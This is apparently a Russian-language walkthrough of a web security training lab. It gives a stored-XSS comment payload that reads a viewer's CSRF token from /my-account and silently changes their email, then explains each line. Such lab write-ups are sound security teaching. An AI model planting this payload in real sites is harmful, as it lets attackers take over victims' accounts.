Эта лаборатория содержит сохраненную уязвимость XSS в функции комментариев блога. Чтобы решить эту лабораторную задачу, воспользуйтесь уязвимостью, чтобы украсть токен CSRF, который затем можно использовать для изменения адреса электронной почты того, кто просматривает комментарии к записи блога.

Вы можете войти в свою учетную запись, используя следующие учетные данные:`wiener:peter`

## Дано

- сохраненная уязвимость XSS в функции комментариев блога
- учётка wiener:peter
## Задача

- украсть токен CSRF, который затем можно использовать для изменения адреса электронной почты того
# Решение

1. Зайдём на учётку посмотрим функционал 
2. Испольузется csrf токен так же на куки включён httponly
3. Пишем скрипт в коментах
```
<script> 
var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account',true); 
req.send();
function handleResponse() { 
	var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
	var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') 
	}; 
</script>
```

#### 1. **Создание XMLHttpRequest объекта**
```
var req = new XMLHttpRequest();
```
Здесь создается объект `XMLHttpRequest`, который позволяет отправлять HTTP-запросы на сервер и получать ответы без перезагрузки страницы.

#### 2. **Настройка обработчика ответа**
```
req.onload = handleResponse;
```
Устанавливается функция `handleResponse`, которая будет вызвана, когда запрос завершится и данные будут получены.

### 3. **Отправка GET-запроса**
```
req.open('get', '/my-account', true);
req.send();
```
Отправляется GET-запрос на эндпоинт `/my-account`. Этот запрос предназначен для получения HTML-страницы, содержащей CSRF-токен.

### 4. **Обработка ответа**
```
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
```
Когда ответ от сервера получен, функция `handleResponse` извлекает CSRF-токен из HTML-кода страницы. Это делается с помощью регулярного выражения, которое ищет строку вида `name="csrf" value="токен"` и извлекает значение токена.

### 5. **Создание нового XMLHttpRequest для изменения email**
```
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf=' + token + '&email=test@test.com');
}
```
После получения CSRF-токена создается новый `XMLHttpRequest` объект, который отправляет POST-запрос на эндпоинт `/my-account/change-email`. В теле запроса передаются CSRF-токен и новый email (`test@test.com`). Этот запрос изменяет email пользователя на указанный.

### Как это работает при XSS:

1. **Внедрение скрипта**:  Внедряем этот скрипт на страницу, которую просматривает жертва, используя уязвимость.
2. **Выполнение скрипта**: Когда жертва загружает страницу, скрипт автоматически выполняется в её браузере.
3. **Получение CSRF-токена**: Скрипт отправляет запрос на страницу `/my-account`, чтобы получить CSRF-токен, который необходим для выполнения изменений в аккаунте.
4. **Изменение email**: Используя полученный CSRF-токен, скрипт отправляет POST-запрос на изменение email пользователя на `test@test.com`.

